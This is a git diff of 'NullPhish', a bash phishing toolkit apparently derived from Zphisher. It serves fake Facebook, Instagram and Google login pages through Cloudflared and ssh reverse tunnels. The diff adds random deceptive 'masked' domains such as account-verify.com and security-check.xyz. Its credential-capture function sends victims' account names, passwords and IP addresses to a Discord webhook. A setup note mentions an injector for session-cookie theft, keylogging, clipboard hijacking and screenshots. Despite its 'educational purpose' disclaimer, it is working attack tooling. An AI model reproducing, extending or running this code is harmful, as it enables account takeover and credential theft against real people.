@@ -1,7 +1,7 @@
 #!/bin/bash
 ##   NullPhish   :   Automated Phishing Tool
 ##   Author      :   r4tur1
-##   Version     :   1.1
+##   Version     :   2.0
 ##   Github      :   https://github.com/r4tur1/NullPhish
 ##
 ##   Based on Zphisher by htr-tech
@@ -10,20 +10,10 @@
 ##
 ##   Licensed under GNU General Public License v3.0
 ##   See LICENSE file for details.
-##
-##   THANKS TO:
-##   1RaY-1          - https://github.com/1RaY-1
-##   Aditya Shakya   - https://github.com/adi1090x
-##   Ali Milani      - https://github.com/AliMilani
-##   Ignitetch       - https://github.com/Ignitetch/AdvPhishing
-##   Moises Tapia    - https://github.com/MoisesTapia
-##   Mr.Derek        - https://github.com/E343IO
-##   Mustakim Ahmed  - https://github.com/bdhackers009
-##   TheLinuxChoice  - https://twitter.com/linux_choice
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
-PORT='8080' 
+PORT='8080'
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -31,6 +21,9 @@ MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\0
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
+
+## Version
+__version__="2.0"
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
@@ -50,14 +43,8 @@ else
 	mkdir -p ".server/www"
 fi
 
-## Remove logfile
-if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
-fi
-
-if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
-fi
+## Remove old logfiles
+rm -f .server/.cld.log .server/.lhr.log .server/.serveo.log .server/.pinggy.log 2>/dev/null
 
 ## Script termination
 exit_on_signal_SIGINT() {
@@ -75,50 +62,38 @@ trap exit_on_signal_SIGTERM SIGTERM
 
 ## Reset terminal colors
 reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
+	tput sgr0
+	tput op
 	return
 }
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx"
+	check_PID="php cloudflared ssh"
 	for process in ${check_PID}; do
-		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Kill the Process
+		if [[ $(pidof ${process}) ]]; then
+			killall ${process} > /dev/null 2>&1
 		fi
 	done
 }
 
-# Check for a newer release
-check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/r4tur1/NullPhish/releases/latest'
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/r4tur1/NullPhish/archive/refs/tags/${new_version}.tar.gz"
-
-	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}update found\n"${WHITE}
-		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
-		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".nullphish.tar.gz" "${tarball_url}"
-
-		if [[ -e ".nullphish.tar.gz" ]]; then
-			tar -xf .nullphish.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .nullphish.tar.gz
-			popd > /dev/null 2>&1
-			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run nullphish again\n\n"${WHITE}
-			{ reset_color ; exit 1; }
+## Git pull latest version on startup
+auto_update() {
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for updates..."
+	if [[ -d ".git" ]]; then
+		git fetch origin > /dev/null 2>&1
+		local_head=$(git rev-parse HEAD)
+		remote_head=$(git rev-parse @{u} 2>/dev/null)
+		if [[ "$local_head" != "$remote_head" && -n "$remote_head" ]]; then
+			echo -e "${ORANGE}[${WHITE}!${ORANGE}] Update available. Pulling latest..."
+			git pull origin main --rebase > /dev/null 2>&1
+			echo -e "${GREEN}[${WHITE}+${GREEN}] Updated. Restarting...\n"
+			exec bash "$0"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
-			{ reset_color; exit 1; }
+			echo -e "${GREEN}[${WHITE}+${GREEN}] Already up to date."
 		fi
 	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+		echo -e "${ORANGE}[${WHITE}!${ORANGE}] Not a git repo. Skipping auto-update."
 	fi
 }
 
@@ -126,7 +101,7 @@ check_update(){
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -165,7 +140,6 @@ banner_small() {
 	EOF
 }
 
-
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
@@ -175,17 +149,20 @@ dependencies() {
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
-
 		if [[ ! $(command -v tput) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
+		if [[ ! $(command -v ssh) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}openssh${CYAN}"${WHITE}
+			pkg install openssh -y
+		fi
 	fi
 
-	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v ssh) ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
-		pkgs=(php curl unzip)
+		pkgs=(php curl unzip openssh-client)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
@@ -210,36 +187,7 @@ dependencies() {
 	fi
 }
 
-# Download Binaries
-download() {
-	url="$1"
-	output="$2"
-	file=`basename $url`
-	if [[ -e "$file" || -e "$output" ]]; then
-		rm -rf "$file" "$output"
-	fi
-	curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
-
-	if [[ -e "$file" ]]; then
-		if [[ ${file#*.} == "zip" ]]; then
-			unzip -qq $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
-		elif [[ ${file#*.} == "tgz" ]]; then
-			tar -zxf $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
-		else
-			mv -f $file .server/$output > /dev/null 2>&1
-		fi
-		chmod +x .server/$output > /dev/null 2>&1
-		rm -rf "$file"
-	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
-		{ reset_color; exit 1; }
-	fi
-}
-
-## Install Cloudflared
+## Download Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
@@ -247,40 +195,22 @@ install_cloudflared() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
 		else
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+			curl -sL -o .server/cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
 		fi
-	fi
-}
-
-## Install LocalXpose
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
+		chmod +x .server/cloudflared
 	fi
 }
 
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day. Please give us a ⭐ on github ${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day. ${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -290,25 +220,12 @@ about() {
 	cat <<- EOF
 		${GREEN} Author   ${RED}:  ${ORANGE}r4tur1 ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/r4tur1
-		${GREEN} Social   ${RED}:  ${CYAN}https://r4tur1.is-a.dev
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
 		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
-		
-		${WHITE} ${REDBG} Special Thanks to: ${RESETBG}
-		${RED}  htr-tech        ${WHITE}- ${CYAN}https://github.com/htr-tech        ${WHITE}(Original Zphisher Author)
-		${RED}  1RaY-1          ${WHITE}- ${CYAN}https://github.com/1RaY-1
-		${RED}  Adi1090x        ${WHITE}- ${CYAN}https://github.com/adi1090x
-		${RED}  AliMilani       ${WHITE}- ${CYAN}https://github.com/AliMilani
-		${RED}  BDhackers009    ${WHITE}- ${CYAN}https://github.com/BDhackers009
-		${RED}  KasRoudra       ${WHITE}- ${CYAN}https://github.com/KasRoudra
-		${RED}  E343IO          ${WHITE}- ${CYAN}https://github.com/E343IO
-		${RED}  sepp0           ${WHITE}- ${CYAN}https://github.com/sepp0
-		${RED}  TheLinuxChoice  ${WHITE}- ${CYAN}https://twitter.com/linux_choice
-		${RED}  Yisus7u7        ${WHITE}- ${CYAN}https://github.com/Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -383,11 +300,11 @@ capture_creds() {
 	cat .server/www/usernames.txt >> auth/usernames.dat
 	
 	# ===== DISCORD WEBHOOK FORWARD =====
-	if [[ -f ".server/inject.js" ]]; then
-		WEBHOOK_URL=$(grep -o "webhookURL: '[^']*'" .server/inject.js | cut -d"'" -f2)
+	if [[ -f ".server/.webhook_url" ]]; then
+		WEBHOOK_URL=$(cat .server/.webhook_url)
 		if [[ ! -z "$WEBHOOK_URL" ]]; then
 			curl -s -H "Content-Type: application/json" \
-				-d "{\"embeds\":[{\"title\":\"🔑 New Credentials Captured\",\"color\":65280,\"fields\":[{\"name\":\"Account\",\"value\":\"$ACCOUNT\",\"inline\":true},{\"name\":\"Password\",\"value\":\"||$PASSWORD||\",\"inline\":true},{\"name\":\"IP\",\"value\":\"$IP\",\"inline\":true}]}]}" \
+				-d "{\"embeds\":[{\"title\":\"🔑 New Credentials Captured\",\"color\":65280,\"fields\":[{\"name\":\"Account\",\"value\":\"$ACCOUNT\",\"inline\":true},{\"name\":\"Password\",\"value\":\"||$PASSWORD||\",\"inline\":true},{\"name\":\"IP\",\"value\":\"$IP\",\"inline\":true}],\"footer\":{\"text\":\"NullPhish v2.0 | $(date)\"}}]}" \
 				"$WEBHOOK_URL" > /dev/null 2>&1 &
 		fi
 	fi
@@ -415,63 +332,161 @@ capture_data() {
 	done
 }
 
+## Realistic URL Mask
+generate_masked_url() {
+	local real_url="$1"
+	local masked_domain="$mask"
+	
+	# If no custom mask, generate a realistic one
+	if [[ -z "$masked_domain" || "$masked_domain" == "https://" ]]; then
+		local domains=(
+			"https://account-verify.com"
+			"https://secure-login.net"
+			"https://support-help.org"
+			"https://community-vote.store"
+			"https://gift-reward.online"
+			"https://storage-cloud.xyz"
+			"https://premium-access.info"
+			"https://social-connect.live"
+			"https://official-verify.net"
+			"https://member-login.org"
+			"https://auth-secure.store"
+			"https://profile-update.online"
+			"https://badge-verified.info"
+			"https://security-check.xyz"
+			"https://api-connect.net"
+		)
+		masked_domain="${domains[$RANDOM % ${#domains[@]}]}"
+	fi
+	
+	# Extract tunnel subdomain for better masking
+	local tunnel_subdomain=$(echo "$real_url" | sed 's|https://||' | cut -d'.' -f1)
+	local masked_url="${masked_domain}/${tunnel_subdomain}"
+	
+	MASKED_URL="$masked_url"
+	REAL_URL="$real_url"
+}
+
 ## Start Cloudflared
 start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+	rm -f .server/.cld.log 2>/dev/null
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
 	sleep 8
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	custom_url "$cldflr_url"
-	capture_data
-}
-
-localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+	if [[ -n "$cldflr_url" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
+		generate_masked_url "$cldflr_url"
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$cldflr_url"
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
+		capture_data
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get Cloudflared URL."
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$loclx_token" > $auth_f 2> /dev/null
-		}
-	}
+		tunnel_menu
+	fi
 }
 
-## Start LocalXpose (Again...)
-start_loclx() {
+## Start localhost.run
+start_localhost_run() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; localxpose_auth; }
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
-
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	setup_site
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching localhost.run tunnel..."
+	
+	rm -f .server/.lhr.log 2>/dev/null
+	sleep 2
+	
+	# Run SSH tunnel in background with keepalive
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -R 80:localhost:$PORT nokey@localhost.run > .server/.lhr.log 2>&1 &
+	local ssh_pid=$!
+	
+	sleep 5
+	lhr_url=$(grep -o 'https://[a-zA-Z0-9.-]*\.lhr\.life' .server/.lhr.log)
+	
+	if [[ -n "$lhr_url" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
+		generate_masked_url "$lhr_url"
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$lhr_url"
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
+		capture_data
 	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish localhost.run tunnel."
+		kill $ssh_pid 2>/dev/null
+		sleep 3
+		tunnel_menu
 	fi
+}
 
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	custom_url "$loclx_url"
-	capture_data
+## Start Serveo
+start_serveo() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Serveo tunnel..."
+	
+	rm -f .server/.serveo.log 2>/dev/null
+	sleep 2
+	
+	# Run SSH tunnel with keepalive
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -R 80:localhost:$PORT serveo.net > .server/.serveo.log 2>&1 &
+	local ssh_pid=$!
+	
+	sleep 5
+	serveo_url=$(grep -o 'https://[a-zA-Z0-9]*\.serveo\.net' .server/.serveo.log)
+	
+	if [[ -n "$serveo_url" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
+		generate_masked_url "$serveo_url"
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$serveo_url"
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
+		capture_data
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish Serveo tunnel."
+		kill $ssh_pid 2>/dev/null
+		sleep 3
+		tunnel_menu
+	fi
+}
+
+## Start Pinggy
+start_pinggy() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Pinggy tunnel..."
+	
+	rm -f .server/.pinggy.log 2>/dev/null
+	sleep 2
+	
+	# Run SSH tunnel with keepalive
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -p 443 -R0:localhost:$PORT qr@free.pinggy.io > .server/.pinggy.log 2>&1 &
+	local ssh_pid=$!
+	
+	sleep 8
+	pinggy_url=$(grep -o 'https://[a-zA-Z0-9]*\.a\.pinggy\.io' .server/.pinggy.log)
+	
+	if [[ -n "$pinggy_url" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Tunnel active!"
+		generate_masked_url "$pinggy_url"
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Real URL    : ${GREEN}$pinggy_url"
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked URL  : ${CYAN}$MASKED_URL"
+		capture_data
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish Pinggy tunnel."
+		kill $ssh_pid 2>/dev/null
+		sleep 3
+		tunnel_menu
+	fi
 }
 
 ## Start localhost
@@ -489,9 +504,11 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost        ${RED}[${CYAN}Same Network Only${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared      ${RED}[${CYAN}HTTPS | No Warning | Unlimited${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} localhost.run    ${RED}[${CYAN}HTTPS | SSH Tunnel | Unlimited${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Serveo           ${RED}[${CYAN}HTTPS | SSH Tunnel | Unlimited${RED}]
+		${RED}[${WHITE}05${RED}]${ORANGE} Pinggy           ${RED}[${CYAN}HTTPS | SSH Tunnel | Unlimited${RED}]
 
 	EOF
 
@@ -503,71 +520,15 @@ tunnel_menu() {
 		2 | 02)
 			start_cloudflared;;
 		3 | 03)
-			start_loclx;;
+			start_localhost_run;;
+		4 | 04)
+			start_serveo;;
+		5 | 05)
+			start_pinggy;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
-}
-
-## Custom Mask URL
-custom_mask() {
-	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-	echo
-	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
-		fi
-	fi
-}
-
-## URL Shortner
-site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
-
-shorten() {
-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	if [[ "$1" == *"shrtco.de"* ]]; then
-		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-	else
-		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
-		processed_url=${short#http*//}
-	fi
-}
-
-custom_url() {
-	url=${1#http*//}
-	isgd="https://is.gd/create.php?format=simple&url="
-	shortcode="https://api.shrtco.de/v2/shorten?url="
-	tinyurl="https://tinyurl.com/api-create.php?url="
-
-	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
-
-		url="https://$url"
-		masked_url="$mask@$processed_url"
-		processed_url="https://$processed_url"
-	else
-		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
-	fi
-
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
@@ -586,19 +547,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='https://blue-verified-badge-for-facebook-free'
+			mask=''
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='https://vote-for-the-best-social-media'
+			mask=''
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='https://make-your-facebook-secured-and-free-from-hackers'
+			mask=''
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='https://get-messenger-premium-features-free'
+			mask=''
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -622,19 +583,19 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='https://get-unlimited-followers-for-instagram'
+			mask=''
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
-			mask='https://get-unlimited-followers-for-instagram'
+			mask=''
 			tunnel_menu;;
 		3 | 03)
 			website="insta_followers"
-			mask='https://get-1000-followers-for-instagram'
+			mask=''
 			tunnel_menu;;
 		4 | 04)
 			website="ig_verify"
-			mask='https://blue-badge-verify-for-instagram-free'
+			mask=''
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -657,45 +618,19 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='https://get-unlimited-google-drive-free'
+			mask=''
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
-			mask='https://get-unlimited-google-drive-free'
+			mask=''
 			tunnel_menu;;
 		3 | 03)
 			website="google_poll"
-			mask='https://vote-for-the-best-social-media'
+			mask=''
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
-	esac
-}
-
-## Vk
-site_vk() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="vk"
-			mask='https://vk-premium-real-method-2020'
-			tunnel_menu;;
-		2 | 02)
-			website="vk_poll"
-			mask='https://vote-for-the-best-social-media'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
 
@@ -714,7 +649,7 @@ configure_webhook() {
 		${WHITE}3. Paste it below
 		
 		${ORANGE}NOTE: This will also enable the universal injector
-		(session cookies, keylogger, clipboard hijack).
+		(session cookies, keylogger, clipboard hijack, screenshot).
 		
 	EOF
 	
@@ -723,9 +658,11 @@ configure_webhook() {
 	
 	if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
 		
-		# Create inject.js if it doesn't exist
-		if [[ ! -f ".server/inject.js" ]]; then
-			cat > ".server/inject.js" <<- 'JSEOF'
+		# Save webhook URL
